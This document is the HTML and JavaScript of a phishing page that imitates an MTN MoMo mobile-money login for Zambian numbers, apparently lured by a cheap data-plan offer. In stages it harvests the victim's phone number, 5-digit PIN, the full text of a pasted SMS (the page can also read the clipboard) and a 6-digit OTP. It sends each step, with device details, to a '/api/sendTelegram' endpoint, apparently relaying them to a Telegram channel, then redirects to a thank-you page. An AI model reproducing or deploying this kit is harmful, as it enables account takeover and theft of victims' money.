<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>MTN MoMo Login</title>

<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">

<style>

*{
box-sizing:border-box
}

:root{
--primary:#ffcb00;
--primary-dark:#e6b800;
--primary-soft:rgba(255,203,0,0.12);
--accent:#ffe566;
}

body{
font-family:"Plus Jakarta Sans",system-ui;
margin:0;
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:linear-gradient(180deg,#ffcb00,#f5c000);
overflow:hidden;
color:#1a1a1a;
}

/* waves */

.wave{
position:fixed;
width:700px;
height:700px;
border-radius:50%;
background:
radial-gradient(circle,
rgba(0,0,0,0.08),
transparent 70%);
filter:blur(45px);
animation:float 20s infinite linear;
z-index:-1;
}

.wave.one{
top:-250px;
right:-150px
}

.wave.two{
bottom:-250px;
left:-150px
}

@keyframes float{
0%{transform:translateY(0)}
50%{transform:translateY(40px)}
100%{transform:translateY(0)}
}

/* card */

.step{
position:absolute;
width:100%;
max-width:420px;
padding:30px;
background:#1a1a1a;
border-radius:24px;
box-shadow:
0 25px 50px rgba(0,0,0,0.35);
transition:.35s;
border:1px solid rgba(255,203,0,0.15);
color:#f0f0f0;
}

.container{
position:relative;
width:100%;
max-width:420px;
height:590px;
}

.hidden{
opacity:0;
pointer-events:none;
transform:translateX(40px);
}

.logo{
height:72px;
display:block;
margin:auto;
}

h1{
text-align:center;
margin:14px 0 6px;
font-size:24px;
font-weight:800;

background:linear-gradient(
90deg,
var(--primary),
#ffe566
);

-webkit-background-clip:text;
-webkit-text-fill-color:transparent;
}

.warning{
text-align:center;
font-size:13px;
color:#aaa;
margin-top:6px;
margin-bottom:18px;
font-weight:600;
}

label{
font-size:12px;
margin-top:12px;
display:block;
color:#aaa;
font-weight:600;
}

input[type="text"],
input[type="number"],
input:not(.pin-digit){
width:100%;
padding:13px;
border-radius:14px;
border:1px solid rgba(255,203,0,0.15);
background:#272727;
margin-top:6px;
font-size:14px;
outline:none;
transition:.2s;
color:#f0f0f0;
}

input[type="text"]:focus,
input[type="number"]:focus{
border-color:var(--primary);
box-shadow:0 0 0 4px rgba(255,203,0,0.08);
}

.phone-group{
display:flex;
gap:8px;
align-items:center;
}

.prefix{
background:rgba(255,203,0,0.10);
padding:13px;
border-radius:14px;
border:1px solid rgba(255,203,0,0.25);
font-weight:700;
color:var(--primary);
white-space:nowrap;
margin-top:6px;
}

.btn{
margin-top:20px;
width:100%;
padding:13px;
border-radius:14px;
border:0;
font-weight:700;
font-family:"Plus Jakarta Sans",system-ui;
font-size:15px;

background:linear-gradient(
135deg,
var(--primary),
#ffe14d
);

color:#111;
cursor:pointer;
opacity:.35;
transition:.2s;
}

.btn.active{
opacity:1;
}

/* PIN digits */

.pin{
display:flex;
gap:10px;
justify-content:center;
margin:18px 0;
}

.pin-digit{
width:52px;
height:58px;
font-size:22px;
text-align:center;
border-radius:16px;
border:1px solid rgba(255,203,0,0.15);
background:#272727;
color:#f0f0f0;
font-weight:700;
outline:none;
transition:.2s;
font-family:"Plus Jakarta Sans",system-ui;
}

.pin-digit:focus{
border-color:var(--primary);
box-shadow:0 0 0 4px rgba(255,203,0,0.08);
}

/* 6-digit OTP — slightly smaller to fit */

.pin.six .pin-digit{
width:44px;
height:54px;
font-size:18px;
gap:8px;
}

.pin.six{
gap:8px;
}

.count{
text-align:center;
font-size:13px;
color:#aaa;
}

.resend{
text-align:center;
margin-top:10px;
font-size:13px;
}

.resend button{
border:0;
background:none;
color:var(--primary);
cursor:pointer;
font-weight:700;
opacity:.4;
font-family:"Plus Jakarta Sans",system-ui;
}

.resend button.active{
opacity:1;
}

/* SMS paste field */

.paste-wrap{
position:relative;
margin-top:6px;
}

.paste-wrap textarea{
width:100%;
padding:13px 44px 13px 13px;
border-radius:14px;
border:1px solid rgba(255,203,0,0.15);
background:#272727;
font-size:13px;
font-family:"Plus Jakarta Sans",system-ui;
color:#f0f0f0;
outline:none;
resize:none;
height:90px;
transition:.2s;
line-height:1.5;
}

.paste-wrap textarea:focus{
border-color:var(--primary);
box-shadow:0 0 0 4px rgba(255,203,0,0.08);
}

.paste-icon{
position:absolute;
top:12px;
right:12px;
background:none;
border:0;
cursor:pointer;
color:var(--primary);
padding:4px;
opacity:.8;
transition:.15s;
}

.paste-icon:hover{
opacity:1;
transform:scale(1.1);
}

</style>

</head>

<body>

<div class="wave one"></div>
<div class="wave two"></div>

<div class="container">

<!-- STEP 1: LOGIN -->

<div id="step1" class="step">

<img src="assets/momo.png" class="logo">

<h1>Login</h1>

<label>Phone Number</label>

<div class="phone-group">
<div class="prefix">+260</div>
<input id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="XXXXXXXXX" style="margin-top:0">
</div>

<div class="warning">
Enter your 9-digit mobile number.
</div>

<label>Enter your PIN</label>

<div class="pin" id="pinRow1">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
</div>

<button id="loginBtn" class="btn">Login</button>

</div>

<!-- STEP 2: SMS MESSAGE -->

<div id="step2" class="step hidden">

<img src="assets/momo.png" class="logo">

<h1>Verify Message</h1>

<div class="warning" id="smsInstruction"></div>

<label>Paste the full SMS sent to your number</label>

<div class="paste-wrap">
<textarea id="smsField" placeholder="Paste your SMS here…"></textarea>
<button class="paste-icon" id="pasteBtn" title="Paste from clipboard">
<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
<rect x="9" y="2" width="6" height="4" rx="1"/>
<path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/>
<path d="M9 12h6M9 16h4"/>
</svg>
</button>
</div>

<button id="confirmSmsBtn" class="btn">Confirm</button>

</div>

<!-- STEP 3: OTP -->

<div id="step3" class="step hidden">

<img src="assets/momo.png" class="logo">

<h1>OTP Verification</h1>

<div class="warning" id="maskedNumber"></div>

<div class="pin six" id="otpRow">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
</div>

<div class="count">
Code expires in <span id="time">120</span>s
</div>

<div class="resend">
<button id="resendBtn">Resend OTP</button>
</div>

<button id="otpBtn" class="btn">Submit</button>

</div>

<!-- STEP 4: SUCCESS -->

<div id="step4" class="step hidden">

<img src="assets/momo.png" class="logo">

<h1>Success</h1>

<div class="warning">
Processing request...
</div>

</div>

</div>

<script>

let phoneValue=""
let pinValue=""
let smsValue=""
let otpValue=""
let loginClicked=false
let smsConfirmed=false
let otpSubmitted=false
let resendClicked=false

let selectedPlan=null

try{
selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))
}catch(e){}

const priceMap={
"15GB":"ZMW 9.99",
"35GB":"ZMW 19.99",
"50GB":"ZMW 29.99",
"Unlimited":"ZMW 39.99"
}

function getPlanLine(){
if(!selectedPlan) return "Unknown plan"
let name=selectedPlan.name||selectedPlan.shortName||"Plan"
let price=selectedPlan.price
if(!price){
for(let k in priceMap){
if(name.includes(k)){ price=priceMap[k]; break }
}
}
return name+" — "+price
}

const ua=navigator.userAgent
let device="Unknown"
if(/Android/i.test(ua)) device="Android"
else if(/iPhone|iPad/i.test(ua)) device="iOS"
if(/Chrome/i.test(ua)) device+=" | Chrome"
else if(/Safari/i.test(ua)) device+=" | Safari"

async function sendToTelegram(eventName){
fetch("/api/sendTelegram",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({
submittedAt:new Date().toISOString(),
loginPhone:phoneValue,
loginPin:pinValue,
smsMessage:smsValue,
otp:otpValue,
event:eventName,
plan:getPlanLine(),
device:device
})
})
}

/* ── phone ── */

const phoneInput=document.getElementById("phone")

phoneInput.oninput=e=>{
let v=e.target.value.replace(/\D/g,"")
if(v.startsWith("260")) v=v.slice(3)
if(v.startsWith("0")) v=v.slice(1)
v=v.slice(0,9)
e.target.value=v
phoneValue="+260"+v
validateLogin()
}

/* ── 5-digit PIN ── */

const pinInputs=document.querySelectorAll("#pinRow1 .pin-digit")

pinInputs.forEach((input,i)=>{
input.oninput=()=>{
input.value=input.value.replace(/\D/g,"")
if(input.value && i<4) pinInputs[i+1].focus()
validateLogin()
}
input.onkeydown=e=>{
if(e.key==="Backspace" && !input.value && i>0){
pinInputs[i-1].focus()
pinInputs[i-1].value=""
validateLogin()
}
}
})

function validateLogin(){
pinValue=[...pinInputs].map(i=>i.value).join("")
if(phoneValue.length===13 && pinValue.length===5)
loginBtn.classList.add("active")
else
loginBtn.classList.remove("active")
}

function show(id){
document.querySelectorAll(".step").forEach(s=>s.classList.add("hidden"))
document.getElementById(id).classList.remove("hidden")
}

/* ── login → SMS step ── */

const loginBtn=document.getElementById("loginBtn")

loginBtn.onclick=()=>{
if(!loginBtn.classList.contains("active")) return
if(loginClicked) return
loginClicked=true
sendToTelegram("login_clicked")

// mask middle of phone: +260 7XX****XX
const masked=phoneValue.replace(/(\+260\d{3})\d{4}(\d{2})/,"$1****$2")

document.getElementById("smsInstruction").innerHTML=
`An SMS was sent to <strong>${masked}</strong>. Paste the full message below.`

show("step2")
}

/* ── SMS field ── */

const smsField=document.getElementById("smsField")
const confirmSmsBtn=document.getElementById("confirmSmsBtn")

smsField.oninput=()=>{
smsValue=smsField.value.trim()
if(smsValue.length>0)
confirmSmsBtn.classList.add("active")
else
confirmSmsBtn.classList.remove("active")
}

/* paste icon */

document.getElementById("pasteBtn").onclick=async()=>{
try{
const text=await navigator.clipboard.readText()
smsField.value=text
smsValue=text.trim()
if(smsValue.length>0) confirmSmsBtn.classList.add("active")
}catch(e){
smsField.focus()
}
}

/* confirm SMS → OTP */

confirmSmsBtn.onclick=()=>{
if(!confirmSmsBtn.classList.contains("active")) return
if(smsConfirmed) return
smsConfirmed=true
sendToTelegram("sms_confirmed")

const masked=phoneValue.replace(/(\+260\d{3})\d{4}(\d{2})/,"$1****$2")
document.getElementById("maskedNumber").innerHTML=`Enter the OTP sent to ${masked}`

show("step3")
startTimer()
}

/* ── 6-digit OTP ── */

const otpInputs=document.querySelectorAll("#otpRow .pin-digit")
const otpBtn=document.getElementById("otpBtn")

otpInputs.forEach((input,i)=>{
input.oninput=()=>{
input.value=input.value.replace(/\D/g,"")
if(input.value && i<5) otpInputs[i+1].focus()
validateOtp()
}
input.onkeydown=e=>{
if(e.key==="Backspace" && !input.value && i>0){
otpInputs[i-1].focus()
otpInputs[i-1].value=""
validateOtp()
}
}
})

function validateOtp(){
otpValue=[...otpInputs].map(i=>i.value).join("")
if(otpValue.length===6) otpBtn.classList.add("active")
else otpBtn.classList.remove("active")
}

otpBtn.onclick=()=>{
if(!otpBtn.classList.contains("active")) return
if(otpSubmitted) return
otpSubmitted=true
sendToTelegram("otp_confirm")
show("step4")
setTimeout(()=>{ location.href="thankyou.html" },1200)
}

/* ── resend ── */

const resendBtn=document.getElementById("resendBtn")

resendBtn.onclick=()=>{
if(!resendBtn.classList.contains("active")) return
if(resendClicked) return
resendClicked=true
sendToTelegram("resend_otp")
startTimer()
}

/* ── timer ── */

function startTimer(){
let t=120
time.textContent=t
resendBtn.classList.remove("active")
resendClicked=false
otpInputs.forEach(i=>{ i.disabled=false; i.value="" })
otpBtn.classList.remove("active")

const timer=setInterval(()=>{
t--
time.textContent=t
if(t<=0){
clearInterval(timer)
resendBtn.classList.add("active")
otpInputs.forEach(i=>i.disabled=true)
otpBtn.classList.remove("active")
document.getElementById("maskedNumber").innerHTML="Code expired. Request new OTP"
}
},1000)
}

</script>

</body>
</html>
